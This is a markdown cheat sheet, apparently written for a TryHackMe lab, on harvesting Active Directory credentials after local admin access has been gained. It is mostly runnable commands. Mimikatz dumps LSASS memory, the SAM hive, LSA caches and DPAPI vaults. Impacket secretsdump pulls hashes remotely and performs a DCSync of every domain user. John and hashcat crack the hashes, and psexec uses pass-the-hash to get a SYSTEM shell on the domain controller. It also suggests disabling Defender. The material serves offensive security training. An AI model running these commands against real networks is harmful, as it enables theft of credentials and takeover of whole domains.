# AD Credential Harvesting — Cheat Sheet

> Phase: **Post-Exploitation / Credential Extraction**
> Goal: use local admin / SYSTEM access to pull credential material from memory, registry hives, DPAPI vaults, and ultimately the domain's NTDS.dit — then reuse (crack or pass-the-hash) to escalate to Domain Admin.

## Variables used

| Placeholder | Meaning |
|---|---|
| `<HOST_IP>` | Target workstation or server IP |
| `<DC_IP>` | Domain Controller IP |
| `<DOMAIN>` | Domain name, e.g. `TRYHACKME` |
| `<USER>` / `<PASS>` | Credential pair |
| `<HASH>` | NTLM hash (for pass-the-hash) |
| `<SAM_PATH>` / `<SYSTEM_PATH>` | Local paths to saved hive copies |
| `<HASHFILE>` | File containing hashes to crack |
| `<WORDLIST>` | Cracking wordlist |

---

## 1. Credential Store Reference

| Store | Holds | Access Method | Tools |
|---|---|---|---|
| **LSASS Memory** | NTLM hashes, Kerberos tickets, sometimes cleartext | Dump live `lsass.exe` memory (needs admin/`SeDebugPrivilege`) | `mimikatz sekurlsa::logonpasswords`, `sekurlsa::minidump` |
| **SAM + SYSTEM Hives** | Local account NTLM hashes | Export registry hives, decrypt with BootKey from SYSTEM | `mimikatz lsadump::sam`, `reg save`, `vssadmin` |
| **LSA Secrets** | Cached domain creds, plaintext service/scheduled-task creds, RDP secrets | RPC via LSARPC, or local reg read (SYSTEM/admin) | `secretsdump.py` (local admin creds), `mimikatz lsadump::secrets` |
| **DPAPI Vault** | Saved app/browser/WiFi/RDP passwords (per-user) | Decrypt via user token or master key | `mimikatz vault::list`, `vault::cred /export` |
| **NTDS.dit** (DC only) | Full domain DB — all users, NTLM + Kerberos keys | Replicate via MS-DRSR (DCSync) or parse offline copy | `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync` |

**Key file locations:**
```
%SystemRoot%\system32\config\SAM
%SystemRoot%\system32\config\SYSTEM
HKLM\SECURITY\Policy\Secrets
%APPDATA%\Microsoft\Protect        (DPAPI master keys)
```

---

## 2. Mimikatz — Local Harvesting

> Run as **Administrator** (disable Defender/AV exclusions if it's blocking execution — lab context only).

### 2.1 DPAPI Vault (saved web/Windows credentials)

```
mimikatz # vault::list
mimikatz # vault::cred /export
```

- `vault::list` → enumerates Windows Credentials / Web Credentials vaults for the current user context
- `vault::cred /export` → dumps stored secrets

> As local Administrator you can read **other local users'** profile vault files, but a **service account's** (e.g. `svc-app`) DPAPI secrets are tied to that account's own context — you need to run/impersonate as that user (or know their password/token) to decrypt them.

### 2.2 SAM + SYSTEM Hives (local account hashes)

**Step 1 — save hive copies (PowerShell as Admin):**
```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

**Step 2 — dump in mimikatz:**
```
mimikatz # lsadump::sam /sam:"<SAM_PATH>" /system:"<SYSTEM_PATH>"
```

### 2.3 LSASS Memory (live session credentials)

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
- `privilege::debug` → enable `SeDebugPrivilege` to read/manipulate process memory
- `sekurlsa::logonpasswords` → dumps usernames, domains, NTLM/SHA1 hashes, and any cleartext found in memory for **current sessions only**

> No active domain-user session on the box → no domain creds recovered here, even if they logged in previously.

### 2.4 LSA Secrets / Cached Domain Creds (MSCacheV2 / DCC2)

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
```
- `token::elevate` → steal a SYSTEM token
- `lsadump::cache` → read on-disk LSA cache → **MSCacheV2 (DCC2)** hashes for domain users who've logged on before (offline-logon cache)

> ⚠️ DCC2 hashes are **not** usable for pass-the-hash — crack offline only (see §4).

---

## 3. Secretsdump.py (Impacket) — Remote, Agentless Harvesting

Uses DCE/RPC over native Windows services — no binary upload, no touching files directly on disk.

### 3.1 Dump local SAM/LSA remotely with local admin creds

```bash
secretsdump.py <HOST>/<USER>:'<PASS>'@<HOST_IP> -output local_dump
```
Format: `HOST/User:Password@Target_IP`
`-output local_dump` → save results to file.

Pulls local SAM hashes + LSA secrets (incl. MSCacheV2/DCC2 for any domain users who've logged in locally).

### 3.2 DCSync — full domain dump (requires DA-equivalent rights)

```bash
secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc -output dc_dump
```
- `-just-dc` → skip local SAM/LSA, perform only **DRSUAPI (DCSync)** replication of `NTDS.dit`
- Simulates a second DC syncing credentials — abuses legitimate replication rights
- Returns: NTLM hashes + Kerberos keys for **every domain user**

**Output format:**
```
username:RID:LM_hash:NT_hash:::
```

---

## 4. Cracking Recovered Hashes

### 4.1 MSCacheV2 / DCC2 (John)

```bash
john --format=mscash2 <HASHFILE> --wordlist=<WORDLIST>
```

### 4.2 Generic hashcat crack

```bash
hashcat -m <MODE> <HASHFILE> <WORDLIST>
```
(Use `-m 2100` for DCC2/MSCacheV2 in hashcat, `-m 1000` for NTLM if cracking rather than passing.)

---

## 5. Pass-the-Hash (PtH) — Using NTLM Hash Directly

Once you have a Domain Admin's NTLM hash (e.g. from DCSync), you don't need the plaintext — authenticate directly.

```bash
psexec.py '<DOMAIN>/Administrator@<DC_IP>' -hashes :<HASH>
```
- `-hashes :<HASH>` → format is `LM:NT` (empty LM is fine, `:<NTHASH>`)
- Drops you into a SYSTEM shell on the target via PtH

---

## 6. Quick Workflow Summary

```
1. Land local admin on a workstation (WRK)
2. mimikatz vault::list / vault::cred /export        → DPAPI secrets (local + web creds)
3. reg save SAM/SYSTEM → mimikatz lsadump::sam        → local account NTLM hashes
4. mimikatz privilege::debug → sekurlsa::logonpasswords→ live session creds (if any)
5. mimikatz token::elevate → lsadump::cache            → DCC2 cached domain creds
   (or) secretsdump.py <HOST>/<USER>:<PASS>@<IP>       → same, remotely, no binaries
6. Crack DCC2: john --format=mscash2 ... --wordlist=...
7. If DA-equivalent rights found:
   secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc -output dc_dump
8. psexec.py '<DOMAIN>/Administrator@<DC_IP>' -hashes :<HASH>   → PtH shell as DA on the DC
```
